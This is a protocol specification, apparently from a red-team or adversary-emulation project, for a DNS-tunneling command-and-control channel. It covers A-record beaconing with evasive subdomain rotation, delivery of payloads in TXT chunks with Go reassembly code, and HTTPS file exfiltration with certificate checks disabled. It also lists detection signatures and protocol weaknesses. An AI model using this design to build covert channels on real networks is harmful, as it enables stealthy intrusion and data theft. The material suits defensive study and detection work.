# Joker Screenmate Protocol Specification

This document provides detailed specification of the DNS tunneling protocol used by Joker Screenmate.

## Overview

The protocol uses three communication channels:

1. **A Record Queries**: Beaconing and job status
2. **TXT Record Queries**: Payload delivery
3. **HTTPS**: File exfiltration

## DNS A Record Protocol

### Purpose

A record queries serve as the beaconing mechanism. The response IP address encodes the job status.

### Query Format

```
Query: <subdomain>.<domain>.
Type:  A
Class: IN

Example: www.timeserversync.com.
         api.timeserversync.com.
         sync.timeserversync.com.
```

### Subdomain Rotation

The agent rotates through 20 legitimate-looking subdomains:

```
www, mail, app, docs, api, cdn, assets, static, portal, login,
auth, secure, support, help, status, update, sync, time, ntp, services
```

**Rationale:**
- Prevents DNS cache hits
- Avoids high-entropy detection
- Mimics legitimate traffic patterns

### Response Encoding

The server responds with an IP from one of two RFC 5737 ranges:

| IP Range | Binary Encoding | Meaning |
|----------|----------------|---------|
| 198.51.100.0/24 | First octet < 200 | NO_JOB |
| 203.0.113.0/24 | First octet >= 200 | JOB_PENDING |

**Example Responses:**

```
NO_JOB:     198.51.100.42  → Agent sleeps, continues beaconing
JOB_PENDING: 203.0.113.17  → Agent initiates TXT transfer
```

### Agent Detection Logic

```go
func IsJobIP(ip net.IP) bool {
    // Check if IP is in JOB range (203.0.113.0/24)
    jobNet := net.IPNet{
        IP:   net.ParseIP("203.0.113.0"),
        Mask: net.CIDRMask(24, 32),
    }
    return jobNet.Contains(ip)
}
```

## DNS TXT Record Protocol

### Purpose

TXT records deliver payloads from server to agent in base64-encoded chunks.

### Query Format

```
Query: verify.<domain>.
Type:  TXT
Class: IN

Example: verify.timeserversync.com.
```

**Note:** Fixed subdomain "verify" is used because:
- TXT queries go directly to C2 (not via resolver)
- Caching is not a concern
- Simplifies server-side routing

### Routing: Direct vs Resolver

| Query Type | Target | Reason |
|------------|--------|--------|
| A Record | Local Resolver | Blends with normal traffic |
| TXT Record | C2 Direct | Bypasses caching, ensures fresh data |

### Chunk Format

Each TXT response contains one chunk:

```
┌─────────────────────────────────────────────────────────┐
│                    TXT Record Value                      │
├──────────────┬──────────────────────────────────────────┤
│ Sequence Num │        Base64 Payload Data               │
│  (8 bytes)   │         (up to ~200 bytes)               │
└──────────────┴──────────────────────────────────────────┘
```

**Format Details:**
- **Sequence Number**: 8-digit zero-padded integer (00000000-99999999)
- **Payload**: Base64-encoded binary data
- **Max Chunk Size**: ~200 bytes (DNS TXT record limit consideration)
- **Total Capacity**: Supports files up to ~200MB (99,999,999 × 200 bytes)

### Example Chunks

```
Chunk 1: "00000000VGhpcyBpcyB0aGUgZmlyc3QgY2h1bms="
Chunk 2: "00000001VGhpcyBpcyB0aGUgc2Vjb25kIGNodW5r"
Chunk 3: "00000002VGhpcyBpcyB0aGUgdGhpcmQgY2h1bms="
Final:   "" (empty string signals transfer complete)
```

### Transfer State Machine

```
┌─────────────────┐
│   IDLE          │◄────────────────────────────────────┐
│ (No job)        │                                     │
└────────┬────────┘                                     │
         │ Job triggered                                │
         ▼                                              │
┌─────────────────┐                                     │
│   CHUNKING      │                                     │
│ Load payload    │                                     │
│ Split to chunks │                                     │
└────────┬────────┘                                     │
         │ Ready                                        │
         ▼                                              │
┌─────────────────┐                                     │
│   TRANSFERRING  │◄─────────┐                          │
│ Send next chunk │          │                          │
└────────┬────────┘          │                          │
         │                   │ More chunks              │
         ├───────────────────┘                          │
         │ All sent                                     │
         ▼                                              │
┌─────────────────┐                                     │
│   COMPLETE      │                                     │
│ Send empty TXT  │─────────────────────────────────────┘
└─────────────────┘  Reset state
```

### Server-Side Chunk Management

```go
func (s *Server) TriggerJob(payloadPath string) error {
    // Read payload file
    data, err := os.ReadFile(payloadPath)
    if err != nil {
        return err
    }

    s.mu.Lock()
    defer s.mu.Unlock()

    // Chunk the data (200 bytes per TXT record)
    s.payloadChunks = protocol.ChunkData(data, 200)
    s.currentChunk = 0
    s.transferDone = false
    s.jobPending = true

    return nil
}
```

### Agent-Side Chunk Reassembly

```go
func receivePayload(client *dns.Client) ([]byte, error) {
    var payload []byte

    for {
        chunk, isEmpty, err := client.QueryTXT()
        if err != nil {
            return nil, err
        }

        if isEmpty {
            // Empty response = transfer complete
            break
        }

        // Parse sequence and data
        seq, data := protocol.ParseChunk(chunk)

        // Decode base64
        decoded, _ := base64.StdEncoding.DecodeString(data)
        payload = append(payload, decoded...)

        // Delay between queries
        time.Sleep(1500 * time.Millisecond)
    }

    return payload, nil
}
```

## HTTPS Exfiltration Protocol

### Purpose

HTTPS provides high-bandwidth channel for exfiltrating files from agent to server.

### Endpoint

```
POST /upload HTTP/1.1
Host: <server_ip>:8443
Content-Type: application/octet-stream
X-Filename: <original_filename>
Content-Length: <file_size>

<binary file data>
```

### TLS Configuration

- **Certificate**: Self-signed (auto-generated)
- **Verification**: Disabled on agent (InsecureSkipVerify=true)
- **Key Size**: RSA 2048-bit

### Upload Flow

1. Agent checks connectivity via `GET /health`
2. Agent opens file and gets size
3. Agent streams file body to `/upload`
4. Server saves with timestamp prefix
5. Server responds 200 OK

### Headers

| Header | Purpose | Example |
|--------|---------|---------|
| `Content-Type` | MIME type | `application/octet-stream` |
| `X-Filename` | Original name | `employees_dir.zip` |
| `Content-Length` | File size | `1048576` |

## Timing Parameters

### Beacon Timing

```go
const (
    BeaconInterval = 300  // 5 minutes base
    Jitter         = 120  // ±2 minutes
)

// Actual interval: 180-420 seconds (3-7 minutes)
sleepTime := protocol.CalculateJitter(BeaconInterval, Jitter)
```

### TXT Transfer Timing

```go
const TXTQueryDelayMs = 1500  // 1.5 seconds between chunks
```

### HTTPS Transfer

- No timeout (streams until complete)
- Connection timeout: 10 seconds

## Wire Format Examples

### A Query (Beacon)

```
DNS Query:
  ID:      0x1234
  Flags:   0x0100 (RD=1)
  QDCOUNT: 1
  Question:
    QNAME:  www.timeserversync.com.
    QTYPE:  A (1)
    QCLASS: IN (1)
```

### A Response (No Job)

```
DNS Response:
  ID:      0x1234
  Flags:   0x8180 (QR=1, RD=1, RA=1)
  QDCOUNT: 1
  ANCOUNT: 1
  Answer:
    NAME:   www.timeserversync.com.
    TYPE:   A (1)
    CLASS:  IN (1)
    TTL:    300
    RDATA:  198.51.100.42  ← NO_JOB range
```

### A Response (Job Pending)

```
DNS Response:
  ID:      0x5678
  Flags:   0x8180
  Answer:
    NAME:   api.timeserversync.com.
    TYPE:   A (1)
    CLASS:  IN (1)
    TTL:    300
    RDATA:  203.0.113.17  ← JOB range
```

### TXT Query (Payload Request)

```
DNS Query:
  ID:      0x9ABC
  Flags:   0x0000 (No RD - direct to authoritative)
  Question:
    QNAME:  verify.timeserversync.com.
    QTYPE:  TXT (16)
    QCLASS: IN (1)
```

### TXT Response (Chunk)

```
DNS Response:
  ID:      0x9ABC
  Flags:   0x8400 (QR=1, AA=1)
  Answer:
    NAME:   verify.timeserversync.com.
    TYPE:   TXT (16)
    CLASS:  IN (1)
    TTL:    300
    RDATA:  "00000000VGhpcyBpcyBhIHRlc3Q="
```

## Detection Signatures

### DNS Indicators

| Indicator | Detection Rule |
|-----------|---------------|
| Excessive TXT queries | `dns.qtype == TXT AND count > threshold` |
| Base64 in TXT | `dns.txt matches /[A-Za-z0-9+/]{20,}={0,2}/` |
| RFC 5737 responses | `dns.a in [198.51.100.0/24, 203.0.113.0/24]` |
| Fixed "verify" subdomain | `dns.qname contains "verify."` |

### Network Indicators

| Indicator | Detection Rule |
|-----------|---------------|
| DNS followed by HTTPS | Correlation within 60 seconds |
| Self-signed cert on 8443 | Certificate validation failure |
| Large POST to /upload | `http.method == POST AND http.uri == "/upload"` |

## Security Analysis

### Protocol Strengths

- Uses legitimate DNS infrastructure
- Blends with normal DNS traffic
- TXT payload hidden in standard record type
- HTTPS for high-bandwidth exfiltration

### Protocol Weaknesses

- TXT queries at fixed subdomain are distinctive
- Base64 encoding is recognizable
- RFC 5737 ranges easily blocked
- Sequential chunk numbering is predictable

## Next Steps

- [Architecture](architecture.md) - System design overview
- [Detection Guide](detection-guide.md) - Detection strategies
- [Server Guide](server-guide.md) - Server setup
